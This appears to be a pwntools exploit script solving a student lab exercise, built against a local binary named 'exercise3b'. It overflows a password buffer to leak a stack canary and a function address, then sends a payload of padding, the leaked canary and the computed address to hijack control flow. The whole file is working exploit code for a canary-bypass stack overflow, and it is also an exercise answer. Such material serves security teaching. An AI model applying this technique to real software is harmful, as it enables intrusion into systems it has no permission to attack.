#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *check_authorization+91
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()

# You can now communicate with the process, e.g.,
# print(r.recvline()) # only in GDB - Remote debugging from host

print(r.recvline()) # Enter password
r.sendline(b"A"*127)

print(r.recvline())        # Well of course
st = r.recvline()          # can_val is not the password
print(st)

canary_value = st[:4]
hw_addr = st[4:st.index(b' ')]
hw_addr = hw_addr + p32(0)[:8-len(hw_addr)]
print(hw_addr)
fn_addr = p64(u64(hw_addr) - 31)
print(f"Canary value: {hex(u32(canary_value))}")
print(f"Hello World Func Address: {hex(u64(hw_addr))}")

print(r.recvline())        # Unauthorized
print(r.recvline())        # Enter password

payload = b"A"*128
payload += canary_value
payload += b"A"*36
payload += fn_addr
# payload += b'\n'
print(f"Sending: {payload}")

# r.newline = b'\r\n'
r.sendline(payload)
# r.clean()

print(r.recvline())
print(r.recvline())
# print(r.recvline())